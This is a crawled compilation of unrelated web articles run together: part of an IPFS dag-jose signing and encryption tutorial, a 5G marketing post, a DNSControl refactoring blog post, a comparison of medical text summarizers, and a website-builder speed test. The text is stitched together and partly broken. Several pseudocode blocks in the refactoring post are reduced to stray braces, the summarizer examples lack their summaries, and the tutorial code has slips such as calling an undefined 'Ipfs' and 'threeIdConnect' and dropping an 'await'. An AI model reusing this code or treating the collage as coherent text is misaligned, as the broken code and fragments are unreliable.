tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    …</code></pre></div></section></div>

November 19, 2020 | https://netsells.co.uk/insights/what-does-5g-mean-for-mobile-app-development | <a href="https://web.archive.org/web/*/https://netsells.co.uk/insights/what-does-5g-mean-for-mobile-app-development">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-6d89a738=""><h2><span>Is 5G the new 4G?&nbsp;</span></h2>
<p><span>Yes and no.&nbsp;</span></p>
<p><span>Whilst the purpose is the same- to bring fast and reliable internet connectivity to smart device users, the implementation is entirely new. 5G uses a different infrastructure, which strengthens mobile connectivity and improves user experience by delivering sharing speeds of up to 10 gigabits a second.</span></p>
<p><span>This enables developers to implement new, more demanding featuresets, ultimately allowing for more powerful applications than ever before.</span></p>
<h2><span>How Will 5G Impact Development?</span></h2>
<p><span>5G will enable developers to improve the user experience of applications, not only by increasing the speed of execution in existing processes, but using new features such as AR and VR to the fullest extent- allowing for applications which implement these features to stay operational without a stable wifi connection.</span></p>
<p><span>In addition, the high-speed-low-latency connection 5G provides allows for integrated video, images and games to load faster, creating more immersive user experiences. This helps to ensure you retain users and long-term popularity.&nbsp;</span></p>
<p><span>5G will also allow developers to integrate other technologies more effectively. For example, the app market will likely see a rise in cloud-based applications, with data being stored remotely. This will decrease the amount of data users need to store on their device, and will work to close the gap of limitations between devices processing power and hardware.</span></p>
<h2><span>Lower Latency</span></h2>
<p><span>Delays are a cause for concern when developing mobile applications. Interruptions such as buffering or downloading can drastically impact your user experience, bringing drop-offs in user attentiveness and in some cases even causing the application to fail.&nbsp;</span></p>
<p><span>Current 4G technologies have an average latency of 50 milliseconds. 5G cuts this to just 1 millisecond, bringing a drastic improvement to the speed of mobile applications. This enables businesses to create more intricate products and update existing applications to expand their current offering.&nbsp;</span></p>
<h2><span>Increased Connection Density</span></h2>
<p><span>Connection density refers to the network’s ability to deliver several messages in highly populated areas. Currently, 4G allows roughly 2,000 connected devices per 0.38 square miles- with connections slowing and beginning to fail when this number is exceeded.&nbsp;</span></p>
<p><span>5G addresses this by increasing the number of devices to 1 million, future proofing the mobile application market at a time where more portable smart devices than ever rely on cellular.&nbsp;</span></p>
<h2><span>How Will 5G Impact My Business?</span></h2>
<p><span>Through the affordances of 5G technology, businesses will be able to leverage new features and improve existing products to ensure that their mobile application meets the changing demands of consumers worldwide.&nbsp;</span></p>
<p><span>Whilst 5G hasn’t become the standard yet, it undoubtedly will within the next few years, as 4G begins to </span><a href="https://www.ispreview.co.uk/index.php/2019/02/countries-ranked-by-4g-download-speed-at-different-times-of-day.html"><span>show the burden of being overloaded</span></a><span> with users. As network speeds begin to fluctuate throughout the day (based on the amount of user connections), the existing systems in place will suffer extensive drops in service and eventually become obsolete.</span></p>
<p><span>Lower latency, increased connection density and higher density transfer speeds also translate to increased user retention and app revenues in the coming years. Paying attention to 5G developments at this stage and considering early optimisation will ultimately future-proof your digital presence, allowing you take full advantage of the benefits of 5G.</span></p>

    <div>
      <p>I fixed bug last night.</p>
<p>The bug was difficult to fix because the code was so complex. I wasn’t
really able to fix it until I simplified the code. Once the code was
simplified the bug was easy to fix.  While doing this I
found an anti-pattern that I now call “One loop trying too hard”.</p>

<p>If <code>A</code> never changes, then…</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>

<pre><code data-lang="go">    <span>for</span> <span>...</span> <span>{</span>
        <span>if</span> <span>A</span> <span>{</span> <span>B</span> <span>}</span> <span>else</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>…is probably best refactored as…</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>if</span> <span>A</span> <span>{</span>
        <span>for</span> <span>...</span> <span>{</span> <span>B</span> <span>}</span>
    <span>else</span>
        <span>for</span> <span>...</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Why? First of all, you are evaluating <code>A</code> once for each iteration. If
<code>A</code> doesn’t change, that’s a waste of CPU.  But more importantly, this
is really just two loops that just happened to have the same <code>for ...</code>.  Splitting them out makes the code more readable.</p>
<hr>

<p>I was trying to fix a bug in <a href="http://dnscontrol.org/">DNSControl</a>
related to AWS Route53 DNS updates.</p>
<p>The code had been hacked on my many people over the years to add
support for Route53-style aliases and other things.  It was now very
complex and difficult to understand.</p>
<p>The refactoring didn’t just simplify the code to make it easier to
maintain, I was able to fix some other problems along the way.  For
example, the report of what updates are being performed is now sorted,
which makes it easier for the user to notice irregularities.</p>
<h2 id="sidenote-the-joy-of-automated-integration-tests">Sidenote: The joy of automated integration tests</h2>
<p>Reproducing the bug was easy because DNSControl has an embedded
language for describing test cases. Any bug is first reproduced in
this language. We can run the tests frequently while doing development
so that we know when the bug is fixed.</p>
<p>We never delete the old use-cases. This was we get instant feedback if
there are regressions (i.e. the bug creeping back in).</p>
<p>My favorite aspect of this is that I can make aggressive changes with
confidence: if all the use-cases pass, I’m pretty sure I haven’t
broken anything, even some obscured edge-case that was observed years
ago.</p>
<p>I took advantage of this many times while working on this bug. In
fact, there was one point where I wasn’t sure if a change should be
done one way or another. I was sleepy and feeling lazy so I just ran
all the tests both ways. One made nearly ever test fail; the other
worked.  I was too sleepy (and lazy) to investigate why, but it didn’t
matter because… I was sleepy (and lazy).</p>
<p>By the way, these tests are fully automated and accessible to
everyone.  Until a week ago I was the only person that could run the
full suite of tests. However last week my awesome coworker Max
configured Github Actions so that <a href="https://github.com/StackExchange/dnscontrol/actions/runs/359162543">all the tests</a>
run on each PR, no matter who submitted the code.</p>
<p>This makes it easy for others to contribute to the open source project
because it reduces the anxiety over making changes.  Now any
contributor to the project gets the peace of mind that their code
works and doesn’t break other people’s code. Previously contributors
would manually run the test on the DNS provider they use. Now the
automated tests run on the 7 most important providers; and more soon!</p>
<p>As the project maintainer it makes my job easier because I spend less
time testing, more time reviewing the code. This is particularly
important because this is an open source project, not my full-time
job.</p>
<p><strong>Ok, enough about that…  let’s look at the refactoring!</strong></p>
<h2 id="the-refactor-itself">The refactor itself</h2>
<p>While diagnosing the bug, the code looked like this: (pseudocode)</p>
<div><div>

<span>if</span> <span>Yran</span> <span>{</span> <span>Yfollowup</span> <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This was basically a single loop trying to be two different things.
If invariant was true, it was doing task X, which required follow-up
work (Xfollowup).  If the invariant was false, it was doing task Y,
which required different follow-up work.  It was using <code>Xran</code>/<code>Yran</code>
flags to record which variation of the loop was used so that the
proper follow-up code could be executed.</p>
<p>This was refactored into two separate loops by moving the inner <code>if</code>
to be outside, and repeating the loop code for X and again for Y:</p>
<div><div>

<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>The bug was triggered in some tests but not others. By thinking about
what was different about the failing tests I was able to find the
problem: the Yfollowup task needed to be done for every Y, not just at
the end.</p>
<p>In other words, Yfollowup was to be moved up into the <code>for</code> loop.</p>
<div><div>

<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>After the code was refactored it was easy to fix the bug. Prior to the
refactoring I kept adding more flags and conditionals and… ugh, it
was getting worse and worse.</p>
<p>Once the code was refactored, I could fix the bug much easier.</p>
<h2 id="the-anti-pattern">The anti-pattern</h2>
<p>We should name this the “One loop trying too hard” anti-pattern.</p>
<p>The complexity was due to a loop being used for two entirely different
purposes.  It was nice to not have to repeat the loop iterator, but it
was making everything else more complex.</p>
<p>This is a common anti-pattern: one loop doing two things for no good
reason.  The code smell is that the <em>entire</em> body of the loop was
contained in a big if/then/else. If there was no common code between
the two invariants, why not have two loops?</p>

<p>You can view the refactoring PR in Github.  The loop is on
around line 300 of
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files#diff-248e265c7bf6f13c2713cf28a1df30cdbdd0900849b7ce5eb81071b8bfbded90R292"><code>providers/route53/route53Provider.go</code></a> in
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files">StackExchange/dnscontrol#938</a>.</p>
<p>If you would like to maintain your DNS zone files in a “infrastructure
as code” manner, check out <a href="http://dnscontrol.org/">DNSControl</a>.  It now supports <a href="https://stackexchange.github.io/dnscontrol/provider-list">28 DNS providers</a> such as Route53, Google DNS, and Gandi.  It has some interesting features such as the ability to <a href="https://stackexchange.github.io/dnscontrol/spf-optimizer">optimize your SPF records</a>, and use <a href="https://stackexchange.github.io/dnscontrol/code-tricks">macros to assure consistency</a>.
Writing new providers is so easy that many people have written them as
their <a href="https://everythingsysadmin.com/2017/08/go-get-up-to-speed.html">first experience writing
Go</a>!</p>
<p>FunFact: At Stack Overflow we integrated it into our CI/CD system so that devs
can send PRs to request DNS changes, and SREs don’t have to look at
the PR until it passes all our tests (See? More automated testing!).</p>

				<h2><strong>What is the summarization task?</strong></h2>
<p>Text summarization is the process of selecting the most crucial information from a text to create its shortened version based on a specific goal. Broadly there are two different approaches used to solve this task automatically:</p>
<ol>
<li>Extractive summarization</li>
<li>Abstractive summarization</li>

<h2><strong>Extractive summarization</strong></h2>
<p>The name gives away what this approach does: the final summary consists of only sentences and phrases in the original text. The main goal of extractive summarization algorithms is to identify the importance of sentences and phrases.&nbsp; Then it extracts those that have the highest one.</p>
<p>The diagram below illustrates the essence of extractive summarization.</p>
<p><img alt="Summarization of Medical Texts Machine Learning" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/summarization-of-medical-texts-machine-learning.jpg"></p>
<p><em>Figure 1. The process of extractive summarization</em></p>
<p>Extractive summaries usually present significant issues and semantic parts of the original text. Due to its simplicity, the approach is suitable for texts of any length.</p>
<h2><strong>Abstractive summarization</strong></h2>
<p>This approach is more complicated because it implies generating a new text in contrast to the extractive summarization. In other words, abstractive summarization algorithms use parts of the original text to get its essential information and create shortened versions of the text. They can contain words and phrases that are not in the original. Such algorithms are usually implemented via deep neural networks.</p>
<p>The process of abstractive summarization looks like how people work with information. The principle is illustrated in the diagram below.</p>
<p><img alt="Abstractive Summarization Using Machine Learning " src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/abstractive-summarization-using-machine-learning.jpg"></p>
<p><em>Figure 2. The process of abstractive summarization</em></p>
<h2><strong>Comparison of abstractive and extractive approaches</strong></h2>
<ul>
<li>Abstractive summaries are usually much more coherent and less informative than extractive ones.</li>
<li>Many abstractive summarization models use attention mechanisms, making them unsuitable for long texts. (original <a href="https://arxiv.org/abs/1706.03762">paper</a>).</li>
<li>Extractive summary algorithms are much easier to create. Sometimes even no specific datasets are necessary. In contrast, abstractive ones need a lot of specially marked-up texts.</li>
</ul>
<h2><strong>Models</strong></h2>
<p>Today, there are many different models for summarizing a text in English (you can find more information <a href="https://github.com/sebastianruder/NLP-progress/blob/master/english/summarization.md">here</a>). There is no specific theory to figure out which model works fine for a particular kind of text. It needs experimenting.</p>
<p>We compared abstractive and extractive summarization models when used in scientific medicine texts. The main feature of such texts is that they contain plenty of numbers, graphic objects which provide readers with little information by themselves. Thus, models should “understand” it and exclude such parts of the text from the final summary.</p>
<p>We considered two models: BART_Summarizer (abstractive summarizer) and BERT_Summarizer (extractive summarizer).</p>
<h2><strong><em>BART_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1910.13461">BART</a> is a model that generalizes the approaches of the <a href="https://arxiv.org/abs/1810.04805">BERT</a> and <a href="https://d4mucfpksywv.cloudfront.net/better-language-models/language-models.pdf">GPT-2</a> models. It uses a bidirectional encoder and an autoregressive decoder. This language model can be applied to a wide range of text generation tasks, including automatic text summarization. The model builds an abstract summary and works efficiently with not very long texts. Currently shows one of the best ROUGE scores on the news dataset «CNN/DailyMail.»</p>
<p>Since this model text length limit, the text can be divided into several parts, summarized independently. Moreover, short sentences (less than 20 symbols) hurt both abstractive and extractive models' performance quality. That’s why during the text preprocessing, parts of these sentences get removed.</p>
<h2><strong><em>BERT_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1810.04805">BERT</a> is a language model developed by Google which can extract semantic features from a text. All these features can be transformed into vectors of words, sentences, and whole text. BERT_Summarizer uses BERT for building vectors of sentences and then clustering algorithm K-Means to allocate all sentences into groups with similar semantics. The final summary gets formulated from sentences that are the most closed to cluster centroids. Such an approach enables the selection of representative sentences of most semantic parts from a text.</p>
<p>The idea of clustering is illustrated below.</p>
<p><img alt="Sentence Clusters" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/sentence-clusters.jpg"></p>
<p><em>Figure 3. Sentence clusters</em></p>
<h2><strong><em>Results</em></strong></h2>
<p>We gathered 20 articles from a<a href="http://www.medicinescience.org/"> medical journal</a> and evaluated the models under the supervision of <a href="https://en.wikipedia.org/wiki/ROUGE_(metric)">ROUGE-metrics</a> and manually. The results showed that both models could be applied to summarize medicine texts. Yet, extractive summarizer works with a bit better quality. It turned out that an abstractive summarizer uses the generating approach. It sometimes makes factual mistakes because medical texts have a complicated structure. Additionally, the model has to work with several parts of the original text independently. Also, abstractive summarization takes much more time on long texts and uses a lot of RAM resources. That’s why extractive summarization for long medical texts is more preferred.</p>
<p>You can try to use the models yourself. Follow the instructions described in the <a href="https://colab.research.google.com/drive/1WZhF3uwTtoAgy3JtTtrAfu-4CrRJXB2e?usp=sharing">demo</a>, explore, and have fun with it. The example of texts that models worked with is provided there as well.</p>
<h2><strong><em>Examples</em></strong></h2>
<h3>1) Original text:</h3>
<p>American researchers have found out that testing blood can reveal the risk of Alzheimer's disease in later years. If the results are confirmed, it would be real progress towards helping patients suffering from these diseases. In most cases, Alzheimer's disease hits the brain slowly. Patients may go on for several years without knowing it. According to doctors, most drugs do not help because they are given too late.</p>
<p>Today doctors use computer scans to determine if there is damage to the brain. An examination based on blood would be an easy and cheap way to test patients. Although researchers are excited about the new blood-based tests, they say that it will not be available for widespread use within the next five to ten years.</p>

<h3>2) Original text:</h3>
<p>The WHO reports that Japanese residents who lived near the Fukushima nuclear reactor are at a higher risk of getting cancer. They say that it is unclear how many people got exposed to high radiation levels, but those living in the area had a higher risk of developing cancer in their lifetime. Small children may develop thyroid cancer.</p>
<p>The organization also reports that leukemia, breast cancer may as well go up. The report suggests that females are more likely to develop cancer than males. Besides, about a third of the emergency workers got exposed to radiation after the accident. The World Health Organization emphasizes that there is no health risk to the rest of the Japanese population. However, people living in the Fukushima area should be observed over a longer period.</p>

        <p>Site builders let you create your own website without writing any code, but the websites they generate aren't always fast. Slow page load times not only affect the experience of your visitors, but <a href="https://www.debugbear.com/docs/metrics/core-web-vitals">can also hurt SEO</a>.</p>
<p>I tested the performance of a similar site built using 14 different website builder tools. This post first presents the overall results and then looks at each website builder in detail.</p>

<h2 id="site-builder-performance-results">Site builder performance results</h2>
<p>The table below shows the test results for each website builder. It's sorted by the site's Lighthouse score, which gives an overall assessment of the performance of a web page. (This is also the score you would get from PageSpeed Insights.)</p>
<p>The Performance score isn't always the best metric to evaluate website performance. You can click on the column headings in the table to sort the different site builders by a different metric.</p>
<p>While Versoly has the highest Lighthouse score on mobile, Wix has the highest score on a desktop device. Strikingly renders initial content the fastest, but it takes a long time for the page to become interactive.</p>

<h3 id="performance-metrics">Performance metrics</h3>
<h4 id="lighthouse-performance-score">Lighthouse Performance Score</h4>
<p>This is an overall assessment of the website's performance, combining 6 different metrics into a score ranging from 0 to 100.</p>
<h4 id="first-contentful-paint-speed-index-si-and-largest-contentful-paint-lcp">First Contentful Paint, Speed Index (SI), and Largest Contentful Paint (LCP)</h4>
<p>The <a href="https://www.debugbear.com/docs/metrics/first-contentful-paint">First Contentful Paint</a> measures when the user first starts seeing page content, such as text or an image.</p>
<p>Speed Index visually measures how quickly the page content reaches its final state.</p>
<p>The <a href="https://www.debugbear.com/docs/metrics/largest-contentful-paint">Largest Contentful Paint</a> measures when the largest element on the page was rendered. Unlike Speed Index, the LCP will increase even if the newly painted element is similar to the previous element content.</p>
<h4 id="tti-time-to-interactive">TTI (Time to Interactive)</h4>
<p>Time to Interactive measures how quickly the page becomes idle, meaning there isn't much ongoing network or CPU activity. This usually means that any interactive elements on the page are ready to be used by the visitor.</p>
<h4 id="cpu-processing-time">CPU Processing Time</h4>
<p>This measures how much time the browser spends on things like running JavaScript code or rendering page content.</p>
<h4 id="page-size">Page Size</h4>
<p>This measures the overall (compressed) download weight of the page.</p>
<h2 id="rendering-performance">Rendering performance</h2>
<p>Minimizing the time it takes for page content to appear after navigating to a page is one of the most important aspects of site performance.</p>
<p>The image shows a side by side view of the rendering timelines of all tested website builders.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/timelines.png" alt="Filmstrips for all tested website builders"></p>
<p>(I added Webflow later, so it's not included in this image.)</p>
<h2 id="a-look-at-the-performance-of-each-site-builder">A look at the performance of each site builder</h2>
<h3 id="versoly">Versoly</h3>
<p>Versoly takes a while to render the image, but doesn't run any additional JavaScript processing once the page has loaded.</p>
<p>A different default background color for the image would make it easier to read the text early on.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly.png" alt="Versoly performance filmstrip"></p>
<p>There are two render-blocking CSS files, both on different domains. That means the existing server connection can't be re-used. The background image does not start loading until the render-blocking CSS has been finished loading.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly-requests.png" alt="Versoly request chart"></p>
<p>Versoly only makes 10 requests overall, which is the lowest request count among all tested site builders.</p>
<h3 id="webflow">Webflow</h3>
<p>Webflow also starts to render quite quickly, but then takes a while to start downloading the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow.png" alt="Webflow performance filmstrip"></p>
<p>With a size of just 2KB, the initial page HTML loads very quickly. However, there are two render-blocking CSS and JavaScript requests, both on different domains that require a new server connection.</p>
<p>The hero background image is defined in the render-blocking CSS file, and therefore doesn't start to load until after the CSS file.</p>
<p>At 355KB the background image is also fairly large and takes a while to download. It could be worth first serving a low-resolution version of the image before starting the full download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow-requests.png" alt="Webflow request chart"></p>
<h3 id="wix">Wix</h3>
<p>Wix quickly renders the general page layout and then loads the image. It looks like the text doesn't show up until a web font is loaded, however this doesn't seem to be the case when testing with a newer version of Chrome.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix.png" alt="Wix performance filmstrip"></p>
<p>Compared to Versoly, the Wix site is a lot chunkier with 66 network requests and 2s of JavaScript execution time.</p>
<p>Wix does not have any render-blocking resources apart from the root document, but downloading the 102KB HTML document can take half a second on a slow connection.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix-requests.png" alt="Wix request chart"></p>
<h3 id="site-123">Site123</h3>
<p>The Site123 page loads fairly quickly, loading two render-blocking CSS files in addition to the document. Once the site has rendered there's isn't much additional work that's done by the CPU.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123.png" alt="Site123 performance filmstrip"></p>
<p>The background image starts loading immediately after the HTML response has arrived, thanks to a <a href="https://www.debugbear.com/blog/resource-hints-rel-preload-prefetch-preconnect"><code>rel="preload"</code></a> tag.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123-requests.png" alt="Site123 request chart"></p>
<h3 id="go-daddy">GoDaddy</h3>
<p>The GoDaddy site contains several render-blocking scripts and stylesheets. The background image loads quickly, as GoDaddy first serves a 1.3KB low-resolution image before serving the higher-resolution version.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy.png" alt="GoDaddy performance filmstrip"></p>
<p>In total, GoDaddy makes 148 network requests when loading the page. Part of this consists of initializing a service worker, so that the site is available offline after the initial load.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy-requests.png" alt="GoDaddy request chart"></p>
<h3 id="jimdo">Jimdo</h3>
<p>The initial render for the Jimdo site is quite slow, and it takes over 6s for the image to show up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo.png" alt="Jimdo performance filmstrip"></p>
<p>The cause of this is a chain of render-blocking CSS requests. First, Jimdo loads <code>layout.css</code>, which in turn contains an <code>@import</code> statement fetching a font definition.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo-requests.png" alt="Jimdo request chart"></p>
<h3 id="yola">Yola</h3>
<p>The Yola site only has partial server-side rendering, most of the work is done by client-side JavaScript. As a result, the page spends 1s running JavaScript before starting to load the background image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola.png" alt="Yola performance filmstrip"></p>
<p>The JavaScript application code, as well as multiple CSS files, also block the initial render for a while.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola-requests.png" alt="Jimdo request chart"></p>
<h3 id="webnode">Webnode</h3>
<p>On the Webnode site, no content is rendered for the first 4s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode.png" alt="Webnode performance filmstrip"></p>
<p>Again we can see a chain of render-blocking CSS requests. The first Typekit CSS file uses <code>@import</code> to load another CSS file.</p>
<p>Importantly, this CSS file is on a different domain, meaning a new server connection has to be set up. This could be sped up by preconnecting to the <code>p.typekit.net</code> domain.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode-requests.png" alt="Webnode request chart"></p>
<h3 id="weebly">Weebly</h3>
<p>Weebly starts rendering after 4s, but text doesn't appear until 5 seconds after opening the page.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly.png" alt="Weebly performance filmstrip"></p>
<p>This is because the page is waiting to load the web fonts before rendering the text. This delay could be avoided by using the CSS <code>font-display: swap</code> option, which would use a default font until the desired font is available.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly-requests.png" alt="Weebly request chart"></p>
<h3 id="wordpress-com">Wordpress.com</h3>
<p>The Wordpress.com site starts to render after about 4s and the image loads after 6s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress.png" alt="Wordpress performance filmstrip"></p>
<p>After the initial load it takes a while for the page to become idle. It makes a total of 355 requests, mostly contacting various advertising domains.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress-requests.png" alt="Wordpress request chart"></p>
<h3 id="strikingly">Strikingly</h3>
<p>Strikingly inlines all necessary CSS into the initial document request. As a result, there are no render-blocking scripts or stylesheets, and Strikingly has the fastest First Contentful Paint with a value of just 1.1s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly.png" alt="Strikingly performance filmstrip"></p>
<p>However, the site then continues to download 1.8MB of JavaScript code. All of this needs to load and execute before the page becomes interactive, for example so that visitors can click on the menu icon.</p>
<p>To speed up that process, the bundle size could be reduced and the two scripts could be loaded in parallel.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-requests.png" alt="Strikingly request chart"></p>
<p>When testing the site with PageSpeed Insights, Lighthouse actually prematurely ends the test before the page finishes loading and becomes interactive. As a result, it reports a Time to Interactive of just 4.5s, and an overall Performance score of 72.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-psi.png" alt="Strikingly PageSpeed Insights score"></p>
<h3 id="square-space">SquareSpace</h3>
<p>SquareSpace starts loading reasonably quickly, but it then takes a long time before the background image shows up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace.png" alt="Squarespace performance filmstrip"></p>
<p>This is because the image is not included in HTML that was rendered on the server, and as a result the browser first needs to download and run 609KB of JavaScript code before starting to load the image.</p>
